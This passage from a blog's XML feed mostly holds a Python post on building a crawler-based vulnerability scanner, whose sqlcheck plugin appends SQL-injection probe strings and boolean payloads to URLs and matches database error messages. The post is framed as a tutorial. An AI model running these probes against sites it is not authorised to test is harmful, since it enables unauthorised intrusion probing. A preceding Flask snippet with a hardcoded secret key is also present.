in&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&apos;POST&apos;</span>:</span><br><span class="line">        session[<span class="string">&apos;username&apos;</span>] = request.form[<span class="string">&apos;username&apos;</span>]</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&apos;index&apos;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&apos;&apos;&apos;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;&lt;input type=text name=username&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;&lt;input type=submit value=Login&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &apos;&apos;&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&apos;/logout&apos;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># &#x5982;&#x679C;&#x7528;&#x6237;&#x540D;&#x5B58;&#x5728;&#xFF0C;&#x5219;&#x4ECE;&#x4F1A;&#x8BDD;&#x4E2D;&#x79FB;&#x9664;&#x8BE5;&#x7528;&#x6237;&#x540D;</span></span><br><span class="line">    session.pop(<span class="string">&apos;username&apos;</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&apos;index&apos;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8BBE;&#x7F6E;&#x5BC6;&#x94A5;&#xFF0C;&#x4FDD;&#x8BC1;&#x4F1A;&#x8BDD;&#x5B89;&#x5168;</span></span><br><span class="line">app.secret_key = <span class="string">&apos;wing1995 is a very good girl&apos;</span></span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python builds vulnerability scanner</title>
      <link href="/2018/10/05/Python-builds-vulnerability-scanner/"/>
      <url>/2018/10/05/Python-builds-vulnerability-scanner/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1493086340302.png" alt=""></p><a id="more"></a><p>&#x4E3B;&#x8981;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#xFF1A;<br>|&#x2013;lib&#x2014;-|&#x2014;core&#x2014;&#x2013;|&#x2014;Download.py<br>|          |            |&#x2014;plugin.py<br>|          |               |&#x2014;Spider.py<br>|          |               |&#x2014;UrlManager.py<br>|          |<br>|          |&#x2014;<em>init</em>.py<br>|<br>|<br>|&#x2013;script&#x2014;-|&#x2014;email_check.py<br>|             |<br>|             |&#x2014;sqlcheck.py<br>|&#x2013;w8ay.py</p><p>(&#x8FD9;&#x91CC;&#x53EA;&#x7ED9;&#x51FA;&#x4E86;&#x5173;&#x952E;&#x7684;&#x7684;&#x4EE3;&#x7801;)</p><p>w8ay.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&apos;&apos;&apos;</span></span><br><span class="line"><span class="string">Name:w8ayScan</span></span><br><span class="line"><span class="string">Author:w8ay</span></span><br><span class="line"><span class="string">Copyright (c) 2017</span></span><br><span class="line"><span class="string">&apos;&apos;&apos;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> lib.core.Spider <span class="keyword">import</span> SpiderMain</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    root = <span class="string">&quot;https://www.shiyanlou.com/&quot;</span></span><br><span class="line">    threadNum = <span class="number">10</span></span><br><span class="line">    <span class="comment">#spider</span></span><br><span class="line">    w8 = SpiderMain(root,threadNum)</span><br><span class="line">    w8.craw()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p></p><p>email_check.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># __author__= &apos;w8ay&apos;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">spider</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,url,html)</span>:</span></span><br><span class="line">        <span class="comment">#print(html)</span></span><br><span class="line">        pattern = re.compile(<span class="string">r&apos;([\w-]+@[\w-]+\.[\w-]+)+&apos;</span>)</span><br><span class="line">        email_list = re.findall(pattern, html)</span><br><span class="line">        <span class="keyword">if</span>(email_list):</span><br><span class="line">            print(email_list)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>sqlcheck.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re,random</span><br><span class="line"><span class="keyword">from</span> lib.core <span class="keyword">import</span> Download</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">spider</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,url,html)</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> url.find(<span class="string">&quot;?&quot;</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        Downloader = Download.Downloader()</span><br><span class="line">        BOOLEAN_TESTS = (<span class="string">&quot; AND %d=%d&quot;</span>, <span class="string">&quot; OR NOT (%d=%d)&quot;</span>)</span><br><span class="line">        DBMS_ERRORS = {<span class="comment"># regular expressions used for DBMS recognition based on error message response</span></span><br><span class="line">        <span class="string">&quot;MySQL&quot;</span>: (<span class="string">r&quot;SQL syntax.*MySQL&quot;</span>, <span class="string">r&quot;Warning.*mysql_.*&quot;</span>, <span class="string">r&quot;valid MySQL result&quot;</span>, <span class="string">r&quot;MySqlClient\.&quot;</span>),</span><br><span class="line">        <span class="string">&quot;PostgreSQL&quot;</span>: (<span class="string">r&quot;PostgreSQL.*ERROR&quot;</span>, <span class="string">r&quot;Warning.*\Wpg_.*&quot;</span>, <span class="string">r&quot;valid PostgreSQL result&quot;</span>, <span class="string">r&quot;Npgsql\.&quot;</span>),</span><br><span class="line">        <span class="string">&quot;Microsoft SQL Server&quot;</span>: (<span class="string">r&quot;Driver.* SQL[\-\_\ ]*Server&quot;</span>, <span class="string">r&quot;OLE DB.* SQL Server&quot;</span>, <span class="string">r&quot;(\W|\A)SQL Server.*Driver&quot;</span>, <span class="string">r&quot;Warning.*mssql_.*&quot;</span>, <span class="string">r&quot;(\W|\A)SQL Server.*[0-9a-fA-F]{8}&quot;</span>, <span class="string">r&quot;(?s)Exception.*\WSystem\.Data\.SqlClient\.&quot;</span>, <span class="string">r&quot;(?s)Exception.*\WRoadhouse\.Cms\.&quot;</span>),</span><br><span class="line">        <span class="string">&quot;Microsoft Access&quot;</span>: (<span class="string">r&quot;Microsoft Access Driver&quot;</span>, <span class="string">r&quot;JET Database Engine&quot;</span>, <span class="string">r&quot;Access Database Engine&quot;</span>),</span><br><span class="line">        <span class="string">&quot;Oracle&quot;</span>: (<span class="string">r&quot;\bORA-[0-9][0-9][0-9][0-9]&quot;</span>, <span class="string">r&quot;Oracle error&quot;</span>, <span class="string">r&quot;Oracle.*Driver&quot;</span>, <span class="string">r&quot;Warning.*\Woci_.*&quot;</span>, <span class="string">r&quot;Warning.*\Wora_.*&quot;</span>),</span><br><span class="line">        <span class="string">&quot;IBM DB2&quot;</span>: (<span class="string">r&quot;CLI Driver.*DB2&quot;</span>, <span class="string">r&quot;DB2 SQL error&quot;</span>, <span class="string">r&quot;\bdb2_\w+\(&quot;</span>),</span><br><span class="line">        <span class="string">&quot;SQLite&quot;</span>: (<span class="string">r&quot;SQLite/JDBCDriver&quot;</span>, <span class="string">r&quot;SQLite.Exception&quot;</span>, <span class="string">r&quot;System.Data.SQLite.SQLiteException&quot;</span>, <span class="string">r&quot;Warning.*sqlite_.*&quot;</span>, <span class="string">r&quot;Warning.*SQLite3::&quot;</span>, <span class="string">r&quot;\[SQLITE_ERROR\]&quot;</span>),</span><br><span class="line">        <span class="string">&quot;Sybase&quot;</span>: (<span class="string">r&quot;(?i)Warning.*sybase.*&quot;</span>, <span class="string">r&quot;Sybase message&quot;</span>, <span class="string">r&quot;Sybase.*Server message.*&quot;</span>),</span><br><span class="line">    }</span><br><span class="line">        _url = url + <span class="string">&quot;%29%28%22%27&quot;</span></span><br><span class="line">        _content = Downloader.get(_url)</span><br><span class="line">        <span class="keyword">for</span> (dbms, regex) <span class="keyword">in</span> ((dbms, regex) <span class="keyword">for</span> dbms <span class="keyword">in</span> DBMS_ERRORS <span class="keyword">for</span> regex <span class="keyword">in</span> DBMS_ERRORS[dbms]):</span><br><span class="line">            <span class="keyword">if</span>(re.search(regex,_content)):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">&quot;sql fonud: %&quot;</span>%url</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        content = {}</span><br><span class="line">        content[<span class="string">&quot;origin&quot;</span>] = Downloader.get(_url)</span><br><span class="line">        <span class="keyword">for</span> test_payload <span class="keyword">in</span> BOOLEAN_TESTS:</span><br><span class="line">            RANDINT = random.randint(<span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">            _url = url + test_payload%(RANDINT,RANDINT)</span><br><span class="line">            content[<span class="string">&quot;true&quot;</span>] = Downloader.get(_url)</span><br><span class="line">            _url = url + test_payload%(RANDINT,RANDINT+<span class="number">1</span>)</span><br><span class="line">            content[<span class="string">&quot;false&quot;</span>] = Downloader.get(_url)</span><br><span class="line">            <span class="keyword">if</span> content[<span class="string">&quot;origin&quot;</span>]==content[<span class="string">&quot;true&quot;</span>]!=content[<span class="string">&quot;false&quot;</span>]:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">&quot;sql fonud: %&quot;</span>%url</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Download.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Downloader</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        r = requests.get(url,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        _str = r.text</span><br><span class="line">        <span class="keyword">return</span> _str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self,url,data)</span>:</span></span><br><span class="line">        r = requests.post(url,data)</span><br><span class="line">        _str = r.text</span><br><span class="line">        <span class="keyword">return</span> _str</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(self, url,htmls)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        _str = {}</span><br><span class="line">        _str[<span class="string">&quot;url&quot;</span>] = url</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            _str[<span class="string">&quot;html&quot;</span>] = r.text</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        htmls.append(_str)</span><br></pre></td></tr></tbody></table></figure><p></p><p>Plugin.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># __author__= &apos;w8ay&apos;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">spiderplus</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,plugin,disallow=[])</span>:</span></span><br><span class="line">        self.dir_exploit = []</span><br><span class="line">        self.disallow = [<span class="string">&apos;__init__&apos;</span>]</span><br><span class="line">        self.disallow.extend(disallow)</span><br><span class="line">        self.plugin = os.getcwd()+<span class="string">&apos;/&apos;</span> +plugin</span><br><span class="line">        sys.path.append(plugin)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list_plusg</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">filter_func</span><span class="params">(file)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> file.endswith(<span class="string">&quot;.py&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">for</span> disfile <span class="keyword">in</span> self.disallow:</span><br><span class="line">                <span class="keyword">if</span> disfile <span class="keyword">in</span> file:</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        dir_exploit = filter(filter_func, os.listdir(self.plugin))</span><br><span class="line">        <span class="keyword">return</span> list(dir_exploit)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(self,url,html)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> _plugin <span class="keyword">in</span> self.list_plusg():</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                m = __import__(_plugin.split(<span class="string">&apos;.&apos;</span>)[<span class="number">0</span>])</span><br><span class="line">                spider = getattr(m, <span class="string">&apos;spider&apos;</span>)</span><br><span class="line">                p = spider()</span><br><span class="line">                s =p.run(url,html)</span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                <span class="keyword">print</span> e</span><br></pre></td></tr></tbody></table></figure><p></p><p>Spider.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core <span class="keyword">import</span> Download,UrlManager,plugin</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> script <span class="keyword">import</span> sqlcheck</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpiderMain</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,root,threadNum)</span>:</span></span><br><span class="line">        self.urls = UrlManager.UrlManager()</span><br><span class="line">        self.download = Download.Downloader()</span><br><span class="line">        self.root = root</span><br><span class="line">        self.threadNum = threadNum</span><br><span class="line">      </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_judge</span><span class="params">(self, domain, url)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (url.find(domain) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_parse</span><span class="params">(self,page_url,content)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> content <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        soup = BeautifulSoup(content, <span class="string">&apos;html.parser&apos;</span>)</span><br><span class="line">        _news = self._get_new_urls(page_url,soup)</span><br><span class="line">        <span class="keyword">return</span> _news</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_new_urls</span><span class="params">(self, page_url,soup)</span>:</span></span><br><span class="line">        new_urls = set()</span><br><span class="line">        links = soup.find_all(<span class="string">&apos;a&apos;</span>)</span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">            new_url = link.get(<span class="string">&apos;href&apos;</span>)</span><br><span class="line">            new_full_url = urljoin(page_url, new_url)</span><br><span class="line">            <span class="keyword">if</span>(self._judge(self.root,new_full_url)):</span><br><span class="line">                new_urls.add(new_full_url)</span><br><span class="line">        <span class="keyword">return</span> new_urls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">craw</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.urls.add_new_url(self.root)</span><br><span class="line">        <span class="keyword">while</span> self.urls.has_new_url():</span><br><span class="line">            _content = []</span><br><span class="line">            th = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> list(range(self.threadNum)):</span><br><span class="line">                <span class="keyword">if</span> self.urls.has_new_url() <span class="keyword">is</span> <span class="keyword">False</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                new_url = self.urls.get_new_url()</span><br><span class="line">                <span class="comment">##sql check</span></span><br><span class="line">                <span class="comment"># try:</span></span><br><span class="line">                <span class="comment">#    if(sqlcheck.sqlcheck(new_url)):</span></span><br><span class="line">                <span class="comment">#        print(&quot;url:%s sqlcheck is valueable&quot;%new_url)</span></span><br><span class="line">                <span class="comment"># except:</span></span><br><span class="line">                <span class="comment">#    pass</span></span><br><span class="line">                print(<span class="string">&quot;craw:&quot;</span> + new_url)</span><br><span class="line">                t = threading.Thread(target=self.download.download,args=(new_url,_content))</span><br><span class="line">                t.start()</span><br><span class="line">                th.append(t)</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> th:</span><br><span class="line">                t.join()</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> _str <span class="keyword">in</span> _content:</span><br><span class="line">                <span class="keyword">if</span> _str <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                new_urls = self._parse(new_url,_str[<span class="string">&quot;html&quot;</span>])</span><br><span class="line">                disallow = [<span class="string">&quot;sqlcheck&quot;</span>]</span><br><span class="line">                _plugin = plugin.spiderplus(<span class="string">&quot;script&quot;</span>,disallow)</span><br><span class="line">                _plugin.work(_str[<span class="string">&quot;url&quot;</span>],_str[<span class="string">&quot;html&quot;</span>])</span><br><span class="line">                self.urls.add_new_urls(new_urls)</span><br></pre></td></tr></tbody></table></figure><p></p><p>UrlManger.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlManager</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.new_urls = set()</span><br><span class="line">        self.old_urls = set()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_new_url</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> self.new_urls <span class="keyword">and</span> url <span class="keyword">not</span> <span class="keyword">in</span> self.old_urls:</span><br><span class="line">            self.new_urls.add(url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_new_urls</span><span class="params">(self, urls)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> urls <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> len(urls) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">            self.add_new_url(url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">has_new_url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(self.new_urls) != <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_new_url</span><span class="params">(self)</span>:</span></span><br><span class="line">        new_url = self.new_urls.pop()</span><br><span class="line">        self.old_urls.add(new_url)</span><br><span class="line">        <span class="keyword">return</span> new_url</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>C++ implements instant messaging software</title>
      <link href="/2018/10/04/C-implements-instant-messaging-software/"/>
      <url>/2018/10/04/C-implements-instant-messaging-software/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1521537842624.png" alt=""></p><a id="more"></a><p>&#x4E3B;&#x8981;&#x4EE3;&#x7801;&#xFF1A;</p><p>common.h:<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 